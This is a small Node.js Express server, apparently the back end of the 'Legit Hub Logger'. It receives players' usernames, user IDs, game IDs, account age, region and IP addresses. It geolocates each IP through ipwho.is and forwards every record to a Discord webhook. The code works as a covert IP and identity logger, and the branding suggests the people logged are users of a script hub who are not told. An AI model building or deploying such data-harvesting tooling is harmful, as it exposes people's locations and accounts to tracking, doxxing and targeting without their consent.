const express = require('express');
const axios = require('axios');
const app = express();

app.use(express.json());

const DISCORD_WEBHOOK = process.env.DISCORD_WEBHOOK || "YOUR_WEBHOOK_URL_HERE";

app.post('/log', async (req, res) => {
  try {
    const { username, displayName, userId, gameId, accountAge, region, ip } = req.body;
    const clientIP = ip || req.ip || req.connection.remoteAddress || 'N/A';

    let country = "Unknown";
    try {
      const geoResponse = await axios.get(`https://ipwho.is/${clientIP}`);
      if (geoResponse.data.success) {
        country = `${geoResponse.data.country} (${geoResponse.data.country_code})`;
      }
    } catch (geoError) {
    }

    const payload = {
      content: "⚔️ **Legit Hub Logger**",
      embeds: [
        {
          color: 65484,
          fields: [
            { name: "👤 Username", value: username || "Unknown", inline: true },
            { name: "🏷️ Display Name", value: displayName || "N/A", inline: true },
            { name: "🌐 IP Address", value: `\`${clientIP}\``, inline: true },
            { name: "🌍 Country", value: country, inline: true },
            { name: "🎂 Account Age", value: accountAge || "N/A", inline: true },
            { name: "🌍 Region", value: region ? region.toUpperCase() : "N/A", inline: true },
            { name: "🆔 User ID", value: String(userId || "N/A"), inline: true },
            { name: "🌐 Game ID", value: String(gameId || "N/A"), inline: false }
          ],
          footer: { text: "Legit Hub System" },
          timestamp: new Date().toISOString()
        }
      ]
    };

    await axios.post(DISCORD_WEBHOOK, payload);
    res.status(200).json({ success: true });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
});
